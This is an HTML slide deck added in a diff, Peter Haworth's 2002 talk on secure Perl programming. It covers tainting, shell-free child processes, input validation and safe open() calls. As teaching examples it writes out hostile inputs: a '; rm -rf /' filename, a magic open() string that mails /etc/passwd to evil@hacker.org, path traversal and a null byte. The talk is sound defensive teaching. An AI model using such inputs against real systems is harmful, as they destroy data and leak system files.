@@ -1,0 +1,492 @@
+<HTML>
+<HEAD>
+<TITLE>Secure Perl Programming</TITLE>
+<LINK REL="stylesheet" HREF="talk.css" TYPE="text/css">
+<LINK REV="made" HREF="mailto:mrodrigu@laptop.xmltwig.com">
+</HEAD>
+
+<BODY>
+
+
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <A NAME="__index__"></A>
+
+
+
+
+<H1><A NAME="secure perl programming">Secure Perl Programming</A></H1>
+<P>&nbsp;</P>
+<P>
+<H2><A NAME="peter haworth">Peter Haworth</A></H2>
+<P>pmh@cpan.org</P>
+<P>IOP Publishing Ltd.</P>
+<P>&nbsp;</P>
+<P>O'Reilly Open Source Convention
+July 22-26, 2002</P>
+<P>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="outline">Outline</A></H1>
+<UL>
+<LI><STRONG><A NAME="item_Robustness">Robustness</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Tainting">Tainting</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Child_processes">Child processes</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Validate_all_user_input">Validate all user input</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Filenames">Filenames</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_open">Magic <CODE>open()</CODE></A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Web_applications">Web applications</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Safe_sequence_numbers">Safe sequence numbers</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Dynamic_method_names">Dynamic method names</A></STRONG><BR>
+
+</UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="introduction">Introduction</A></H1>
+<H2><A NAME="don't trust the user">Don't trust the user</A></H2>
+<UL>
+<LI><STRONG><A NAME="item_eventual">Implicit trust -&gt; eventual disaster</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_more">No trust -&gt; more safety</A></STRONG><BR>
+
+</UL>
+<P>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="robustness">Robustness</A></H1>
+<UL>
+<LI><STRONG><A NAME="item_use_strict"><CODE>use strict</CODE></A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_use_warnings"><CODE>use warnings</CODE></A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Check_return_codes_of_system_calls">Check return codes of system calls</A></STRONG><BR>
+
+<PRE>
+  open STDOUT,'&gt; write-protected';</PRE>
+<LI><STRONG><A NAME="item_Handle_%22impossible_cases%22_explicitly">Handle ``impossible cases'' explicitly</A></STRONG><BR>
+
+<PRE>
+  if( $x == 1 ){
+    do_this();
+  }elsif( $x == 2 ){
+    do_that();
+  }</PRE>
+<LI><STRONG><A NAME="item_perl_%2DT"><CODE>perl -T</CODE></A></STRONG><BR>
+
+</UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="tainting">Tainting</A></H1>
+<UL>
+<LI><STRONG><A NAME="item_Data_from_external_sources_is_tainted">Data from external sources is tainted</A></STRONG><BR>
+
+<PRE>
+  $^X  @ARGV  %ENV
+  &lt;&gt;  read()  readline()  `` qx()    etc
+  shmread()  msgrcv()  getpw*()      etc</PRE>
+<LI><STRONG><A NAME="item_All_data_derived_from_tainted_data_is_also_tainted">All data derived from tainted data is also tainted</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Tainted_data_can%27t_affect_external_sources">Tainted data can't affect external sources</A></STRONG><BR>
+
+<PRE>
+  `` qx()  system()  exec()
+  kill()
+  unlink()  mkdir()  umask()  chmod()    etc
+  open() (for writing)  NOT print() or write()</PRE>
+<LI><STRONG><A NAME="item_are"><CODE>$1</CODE>, <CODE>$2</CODE>, etc are (almost) never tainted</A></STRONG><BR>
+
+<PRE>
+  my($untainted) = $tainted =~ /(\d+)/;</PRE>
+</UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="child processes">Child processes</A></H1>
+<UL>
+<LI><STRONG><A NAME="item_Sanitise_the_environment">Sanitise the environment</A></STRONG><BR>
+
+<PRE>
+  %ENV=( PATH =&gt; '/bin:/usr/bin' );</PRE>
+<LI><STRONG><A NAME="item_Additional_%25ENV_taint_checks">Additional <CODE>%ENV</CODE> taint checks</A></STRONG><BR>
+
+<PRE>
+  PATH IFS CDPATH ENV BASH_ENV</PRE>
+<LI><STRONG><A NAME="item_Don%27t_invoke_the_shell">Don't invoke the shell</A></STRONG><BR>
+
+<PRE>
+  # Unsafe:    $file eq &quot;; rm -rf /&quot;
+  system &quot;prog $file&quot;      and die;</PRE>
+<PRE>
+  # Safe
+  system &quot;prog \Q$file\E&quot;  and die;</PRE>
+<PRE>
+  # No shell, and less taint checks (for now)
+  system '/bin/prog',$file and die;</PRE>
+</UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="child processes  safe pipes">Child processes - Safe pipes</A></H1>
+<UL>
+<LI><STRONG><A NAME="item_Unsafe">Unsafe</A></STRONG><BR>
+
+<PRE>
+  open my $fh,&quot;| mail $user&quot; or die;
+  print $fh $msg;
+  close $fh or die;</PRE>
+<LI><STRONG><A NAME="item_Safe%2C_but_invokes_the_shell">Safe, but invokes the shell</A></STRONG><BR>
+
+<PRE>
+  open my $fh,&quot;| /bin/mail \Q$user\E&quot; or die;
+  print $fh $msg;
+  close $fh or die;</PRE>
+<LI><STRONG><A NAME="item_Safe_and_efficient">Safe and efficient</A></STRONG><BR>
+
+<PRE>
+  defined(my $pid=open my $fh,'|-') or die;
+  if(!$pid){
+    exec '/bin/mail',$user;
+    die &quot;Can't exec&quot;;
+  }
+  print $fh $msg;
+  close $fh or die;</PRE>
+<LI><STRONG><A NAME="item_Perl_5%2E8%2E0">Perl 5.8.0</A></STRONG><BR>
+
+<PRE>
+  open my $fh,'|-','/bin/mail',$user or die;
+  print $fh $msg;
+  close $fh or die;</PRE>
+</UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="validate all user input">Validate all user input</A></H1>
+<UL>
+<LI><STRONG><A NAME="item_Allow_safe%3B_don%27t_disallow_unsafe">Allow safe; don't disallow unsafe</A></STRONG><BR>
+
+<PRE>
+  die &quot;Bad!&quot; if /[;&lt;&gt;&amp;^&quot;']/;     # Bad!</PRE>
+<PRE>
+  die &quot;Bad!&quot; unless /^[\w\s]+$/; # Good</PRE>
+<LI><STRONG><A NAME="item_Check_allowed_ranges">Check allowed ranges</A></STRONG><BR>
+
+<PRE>
+  my ($num) = $input =~ /^(\d+)$/
+    or die &quot;Not an integer&quot;;</PRE>
+<PRE>
+  $num &gt;= 0 &amp;&amp; $num &lt;= 100
+    or die &quot;Out of range&quot;;</PRE>
+<LI><STRONG><A NAME="item_Make_tests_consistent">Make tests consistent</A></STRONG><BR>
+
+</UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="filenames">Filenames</A></H1>
+<UL>
+<LI><STRONG><A NAME="item_Poison_null_byte">Poison null byte</A></STRONG><BR>
+
+<PRE>
+  # Unsafe if $filename eq &quot;hello.unsafe\0&quot;
+  open my $fh, '&lt;', &quot;$filename.safe&quot;
+    or die &quot;Invalid filename&quot;;</PRE>
+<PRE>
+  # Safer
+  die &quot;Invalid filename&quot;
+    if $filename =~ /\0/;
+  open my $fh, '&lt;', &quot;$filename.safe&quot;
+    or die &quot;Invalid filename&quot;;</PRE>
+<LI><STRONG><A NAME="item_Don%27t_allow_paths">Don't allow paths</A></STRONG><BR>
+
+<PRE>
+  # Prevents ../../../../etc/passwd
+  die &quot;Invalid filename&quot;
+    if $filename =~ m#/#;</PRE>
+<LI><STRONG>Allow safe; don't disallow unsafe</STRONG><BR>
+
+<PRE>
+  die &quot;Invalid filename&quot;
+    unless $filename =~ /^\w+$/;</PRE>
+</UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="magic open()">Magic <CODE>open()</CODE></A></H1>
+<UL>
+<LI><STRONG><A NAME="item_open_FH%2C%24fname%3B"><CODE>open FH,$fname;</CODE></A></STRONG><BR>
+
+Full magic
+<PRE>
+  &gt; /etc/passwd
+  mail evil@hacker.org &lt; /etc/passwd |</PRE>
+<P></P>
+<LI><STRONG><A NAME="item_open_FH%2C%22%3C_%24fname%22%3B"><CODE>open FH,&quot;&lt; $fname&quot;;</CODE></A></STRONG><BR>
+
+Slightly magical
+<PRE>
+  -f $fname;   # May be a different file</PRE>
+<P></P>
+<LI><STRONG><A NAME="item_open_FH%2C%22%3C_%24fname%5C0%22%3B"><CODE>open FH,&quot;&lt; $fname\0&quot;;</CODE></A></STRONG><BR>
+
+No magic
+<P></P>
+<LI><STRONG><A NAME="item_new"><CODE>my $fh=IO::File-&gt;new($fname,'&lt;');</CODE></A></STRONG><BR>
+
+No magic, lexical filehandle
+<P></P>
+<LI><STRONG><A NAME="item_open_my_%24fh%2C%27%3C%27%2C%24fname%3B"><CODE>open my $fh,'&lt;',$fname;</CODE></A></STRONG><BR>
+
+As above, with perl 5.6.0
+<P></P></UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="web applications  html forms">Web applications - HTML forms</A></H1>
+<UL>
+<LI><STRONG><A NAME="item_Hidden_fields_aren%27t_secure">Hidden fields aren't secure</A></STRONG><BR>
+
+<PRE>
+  &lt;input type=&quot;hidden&quot; name=&quot;password&quot;
+    value=&quot;secret&quot;&gt;</PRE>
+<LI><STRONG><A NAME="item_Expect_multiple_values">Expect multiple values</A></STRONG><BR>
+
+<PRE>
+  # Unsafe
+  # fname=stuff&amp;fname=action&amp;fname=delete
+  %config = (
+    action =&gt; 'create',
+    filename =&gt; $cgi-&gt;param('fname'),
+  );</PRE>
+<PRE>
+  # Safe
+  $sth-&gt;execute(
+    scalar $cgi-&gt;param('fname')
+  );</PRE>
+<LI><STRONG><A NAME="item_Expect_the_unexpected">Expect the unexpected</A></STRONG><BR>
+
+</UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="web applications  cookies">Web applications - Cookies</A></H1>
+<UL>
+<LI><STRONG><A NAME="item_Mostly_like_hidden_fields">Mostly like hidden fields</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Message_digest_adds_security">Message digest adds security</A></STRONG><BR>
+
+<PRE>
+  # Standard with perl 5.8.0
+  use Digest::MD5 qw(md5_hex);</PRE>
+<PRE>
+  $cookie_val = $val . md5_hex(
+    md5_hex($val . $secret1) . $secret2
+  );</PRE>
+<LI><STRONG><A NAME="item_Check_expiry_dates">Check expiry dates</A></STRONG><BR>
+
+</UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="safe sequence numbers">Safe sequence numbers</A></H1>
+<DL>
+<DT><STRONG><A NAME="item_Not_like_this%21">Not like this!</A></STRONG><BR>
+<DD>
+<PRE>
+  my $seqn=$dbh-&gt;selectall_arrayref(q(
+    select max(key_field)
+    from table1
+  ))-&gt;[0][0]+1;</PRE>
+<DT><STRONG><A NAME="item_Let_the_database_do_it_for_you">Let the database do it for you</A></STRONG><BR>
+<DD>
+<PRE>
+  my $seqn=$dbh-&gt;selectall_arrayref(q(
+    select nextval('name_of_sequence')
+  ))-&gt;[0][0];</PRE>
+<DT><STRONG><A NAME="item_Or_do_it_yourself">Or do it yourself</A></STRONG><BR>
+<DD>
+<PRE>
+  sub nextval{
+    my($name)=@_;
+    $name=~/^\w+$/ or die &quot;Bad sequence name&quot;;</PRE>
+<PRE>
+    my $fh=IO::File-&gt;new(&quot;/path/$name&quot;,O_RDWR|O_CREAT)
+                           or die &quot;Can't open: $!&quot;;
+    flock $fh,LOCK_EX      or die &quot;Can't lock: $!&quot;;
+    chomp(my $next=&lt;$fh&gt;);
+    ++$next;
+    seek $fh,0,0           or die &quot;Can't rewind: $!&quot;;
+    print $fh &quot;$next\n&quot;    or die &quot;Can't write: $!&quot;;
+    close $fh              or die &quot;Can't close: $!&quot;;</PRE>
+<PRE>
+    return $next;
+  }</PRE>
+</DL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="dynamic method names">Dynamic method names</A></H1>
+<H2><A NAME="$obj > $meth ()"><CODE>$obj -&gt; $meth ()</CODE></A></H2>
+<UL>
+<LI><STRONG><A NAME="item_Works_if_%24meth_is_a_method_name">Works if <CODE>$meth</CODE> is a method name</A></STRONG><BR>
+
+<PRE>
+  my $meth = 'do_stuff';
+  $obj -&gt; $meth ();     # $obj-&gt;do_stuff()</PRE>
+<LI><STRONG><A NAME="item_Works_across_packages">Works across packages</A></STRONG><BR>
+
+<PRE>
+  my $meth = 'Other::Pkg::do_stuff';
+  $obj -&gt; $meth ();</PRE>
+<LI><STRONG><A NAME="item_Taint_checks_don%27t_protect">Taint checks don't protect</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_Restrict_the_user%27s_choice">Restrict the user's choice</A></STRONG><BR>
+
+<PRE>
+  if( $meth =~ /^\w+$/
+    and my $ref = $obj-&gt;can(&quot;safe_$meth&quot;)
+  ){
+    $obj -&gt; $ref ();
+  }</PRE>
+</UL>
+<P>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="conclusion">Conclusion</A></H1>
+<UL>
+<LI><STRONG><A NAME="item_Trust_no%2Done">Trust no-one</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_But_do_it_carefully">But do it carefully</A></STRONG><BR>
+
+<LI><STRONG><A NAME="item_It%27s_not_that_hard">It's not that hard</A></STRONG><BR>
+
+</UL>
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR align=left valign=top height="100%">
+	<TD align=left valign=top height="100%">
+	  <H1><A NAME="references">References</A></H1>
+<DL>
+<DT><STRONG><A NAME="item_http%3A%2F%2Fwww%2Edwheeler%2Ecom%2Fsecure%2Dprogr"><A HREF="http://www.dwheeler.com/secure-programs/">http://www.dwheeler.com/secure-programs/</A></A></STRONG><BR>
+<DD>
+Secure programming for Linux/Unix
+<P></P>
+<DT><STRONG><A NAME="item_">&nbsp;</A></STRONG><BR>
+<DD>
+<DT><STRONG><A NAME="item_http%3A%2F%2Fwww%2Ew3%2Eorg%2FSecurity%2FFaq%2F"><A HREF="http://www.w3.org/Security/Faq/">http://www.w3.org/Security/Faq/</A></A></STRONG><BR>
+<DD>
+WWW Security FAQ
+<P></P>
+<DT><STRONG>&nbsp;</STRONG><BR>
+<DD>
+<DT><STRONG><A NAME="item_perldoc_perlsec"><CODE>perldoc perlsec</CODE></A></STRONG><BR>
+<DD>
+Perl documentation on tainting
+<P></P>
+<DT><STRONG>&nbsp;</STRONG><BR>
+<DD>
+<DT><STRONG><A NAME="item_%24CPAN%2Fauthors%2Fid%2FP%2FPM%2FPMH%2Fsecprog%2D">$CPAN/authors/id/P/PM/PMH/secprog-tpc2002.tgz</A></STRONG><BR>
+<DD>
+Latest version of these slides and speaker's notes
+<P></P></DL>
+
+
+	</TD>
+      </TR>
+    </TABLE>
+  
+    <TABLE height="100%">
+      <TR height="100%">
+	<TD height="100%">&nbsp;</TD>
+      </TR>
+    </TABLE>
+  </BODY>
+
+</HTML>
